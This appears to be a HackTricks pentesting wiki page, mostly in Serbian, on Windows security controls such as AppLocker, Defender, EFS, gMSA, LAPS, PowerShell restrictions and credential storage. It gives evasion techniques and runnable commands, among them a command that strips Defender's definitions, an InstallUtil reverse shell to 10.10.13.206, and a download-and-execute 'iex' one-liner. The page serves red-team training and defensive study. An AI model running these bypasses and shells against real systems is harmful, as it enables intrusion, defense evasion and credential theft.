# Windows Security Controls

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Policy

Lista odobrenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih datoteka koje su dozvoljene da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malvera i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoftovo **rešenje za belu listu aplikacija** i daje sistemskim administratorima kontrolu nad **koje aplikacije i datoteke korisnici mogu da pokreću**. Pruža **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows instalacionim datotekama, DLL-ovima, pakovanim aplikacijama i instalaterima pakovanih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i da imaju pisanje pristupa određenim direktorijumima, **ali se sve to može zaobići**.

### Check

Check which files/extensions are blacklisted/whitelisted:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, pružajući način za pregled trenutnog skupa pravila koja se primenjuju na sistemu:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* Korisni **Writable folders** za zaobilaženje AppLocker politike: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti za **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Uobičajeni **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi mogu biti korisni za zaobilaženje AppLocker-a.
* **Loše napisani pravila takođe mogu biti zaobiđena**
* Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i biće dozvoljeno.
* Organizacije često fokusiraju na **blokiranje `%System32%\WindowsPowerShell\v1.0\powershell.exe` izvršnog fajla**, ali zaboravljaju na **druge** [**lokacije izvršnih fajlova PowerShell-a**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
* **DLL enforcement veoma retko omogućen** zbog dodatnog opterećenja koje može staviti na sistem, i količine testiranja potrebnog da se osigura da ništa neće prestati da funkcioniše. Tako da korišćenje **DLL-ova kao backdoor-a će pomoći u zaobilaženju AppLocker-a**.
* Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kojem procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Skladištenje kredencijala

### Menadžer sigurnosnih naloga (SAM)

Lokalni kredencijali su prisutni u ovoj datoteci, lozinke su hash-ovane.

### Lokalna sigurnosna vlast (LSA) - LSASS

**Kredencijali** (hash-ovani) su **sačuvani** u **memoriji** ovog podsistema iz razloga jedinstvenog prijavljivanja.\
**LSA** upravlja lokalnom **sigurnosnom politikom** (politika lozinki, dozvole korisnika...), **autentifikacijom**, **tokenima pristupa**...\
LSA će biti ta koja će **proveriti** date kredencijale unutar **SAM** datoteke (za lokalno prijavljivanje) i **komunicirati** sa **kontrolerom domena** da autentifikuje korisnika domena.

**Kredencijali** su **sačuvani** unutar **procesa LSASS**: Kerberos karte, NT i LM hash-ovi, lako dekriptovane lozinke.

### LSA tajne

LSA može sačuvati na disku neke kredencijale:

* Lozinka računa računara Active Directory (nepristupačan kontroler domena).
* Lozinke računa Windows servisa
* Lozinke za zakazane zadatke
* Više (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory. Prisutna je samo u kontrolerima domena.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) je antivirus koji je dostupan u Windows 10 i Windows 11, i u verzijama Windows Server-a. **Blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da proverite **status** **Defender-a** možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da saznate da li je aktivna):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, takođe možete pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS obezbeđuje datoteke putem enkripcije, koristeći **simetrični ključ** poznat kao **Ključ za enkripciju datoteka (FEK)**. Ovaj ključ je enkriptovan korisnikovim **javnim ključem** i smešten unutar $EFS **alternativnog toka podataka** enkriptovane datoteke. Kada je potrebna dekripcija, koristi se odgovarajući **privatni ključ** korisničkog digitalnog sertifikata za dekripciju FEK-a iz $EFS toka. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Scenariji dekripcije bez inicijacije korisnika** uključuju:

* Kada se datoteke ili fascikle presele na ne-EFS datotečni sistem, kao što je [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), automatski se dekriptuju.
* Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola se dekriptuju pre prenosa.

Ova metoda enkripcije omogućava **transparentan pristup** enkriptovanim datotekama za vlasnika. Međutim, jednostavna promena lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Ključne tačke**:

* EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
* Dekripcija koristi korisnikov privatni ključ za pristup FEK-u.
* Automatska dekripcija se dešava pod specifičnim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
* Enkriptovane datoteke su dostupne vlasniku bez dodatnih koraka.

### Proverite EFS informacije

Proverite da li je **korisnik** **koristio** ovu **uslugu** proverom da li ovaj put postoji: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci koristeći cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle da **enkriptujete** i **dekriptujete** sve datoteke

### Dekripcija EFS datoteka

#### Biti Autoritet Sistem

Ovaj način zahteva da **žrtva korisnik** bude **pokrenut** u **procesu** unutar hosta. Ako je to slučaj, koristeći `meterpreter` sesije možete imitirati token procesa korisnika (`impersonate_token` iz `incognito`). Ili možete jednostavno `migrirati` u proces korisnika.

#### Poznavanje lozinke korisnika

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** kako bi pojednostavio upravljanje servisnim nalozima u IT infrastrukturnim sistemima. Za razliku od tradicionalnih servisnih naloga koji često imaju podešavanje "**Lozinka nikada ne ističe**" omogućeno, gMSA nude sigurnije i upravljivije rešenje:

* **Automatsko upravljanje lozinkama**: gMSA koriste složenu, 240-karakternu lozinku koja se automatski menja u skladu sa politikom domena ili računara. Ovaj proces se obavlja putem Microsoftove usluge za distribuciju ključeva (KDC), eliminišući potrebu za ručnim ažuriranjima lozinki.
* **Povećana sigurnost**: Ovi nalozi su imuni na zaključavanje i ne mogu se koristiti za interaktivna prijavljivanja, čime se povećava njihova sigurnost.
* **Podrška za više hostova**: gMSA se mogu deliti između više hostova, što ih čini idealnim za usluge koje se pokreću na više servera.
* **Mogućnost zakazanih zadataka**: Za razliku od upravljanih servisnih naloga, gMSA podržavaju pokretanje zakazanih zadataka.
* **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Ime servisnog principala (SPN) kada dođe do promena u detaljima sAMaccount-a računara ili DNS imenu, pojednostavljujući upravljanje SPN-om.

Lozinke za gMSA se čuvaju u LDAP svojstvu _**msDS-ManagedPassword**_ i automatski se resetuju svake 30 dana od strane kontrolera domena (DC). Ova lozinka, enkriptovani podatkovni blob poznat kao [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se dobiti samo od strane ovlašćenih administratora i servera na kojima su gMSA instalirani, obezbeđujući sigurno okruženje. Da biste pristupili ovim informacijama, potrebna je sigurna veza kao što je LDAPS, ili veza mora biti autentifikovana sa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Možete pročitati ovu lozinku sa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovom postu**](https://cube0x0.github.io/Relaying-for-gMSA/)

Takođe, proverite ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvršiti **NTLM relay attack** da **pročitate** **lozinku** **gMSA**.

## LAPS

**Rešenje za lozinke lokalnog administratora (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lozinkama lokalnog administratora. Ove lozinke, koje su **nasumične**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory. Pristup ovim lozinkama je ograničen putem ACL-a na ovlašćene korisnike. Uz dodeljene dovoljne dozvole, omogućava se čitanje lozinki lokalnog administratora.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML-bazirani radni tokovi, PowerShell klase i još mnogo toga.

### **Proveri**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Zaobilaženje
```powershell
#Easy bypass
Powershell -version 2
```
U trenutnom Windows-u ta zaobilaženje neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda će vam biti potrebno** **da** _**dodate referencu**_ -> _Pretraži_ -> _Pretraži_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktno zaobilaženje:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Обратна љуска:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kojem procesu i zaobiđete ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Politika izvršavanja

Podrazumevano je postavljena na **ograničeno.** Glavni načini za zaobilaženje ove politike:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Je API koji se može koristiti za autentifikaciju korisnika.

SSPI će biti zadužen za pronalaženje adekvatnog protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim će SSPI pregovarati koji autentifikacioni protokol će se koristiti, ovi autentifikacioni protokoli se nazivaju Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL-a i obe mašine moraju podržavati isti da bi mogle da komuniciraju.

### Main SSPs

* **Kerberos**: Preferirani
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Razlozi kompatibilnosti
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web serveri i LDAP, lozinka u obliku MD5 haša
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
* %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **izdavanje saglasnosti za uzvišene aktivnosti**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
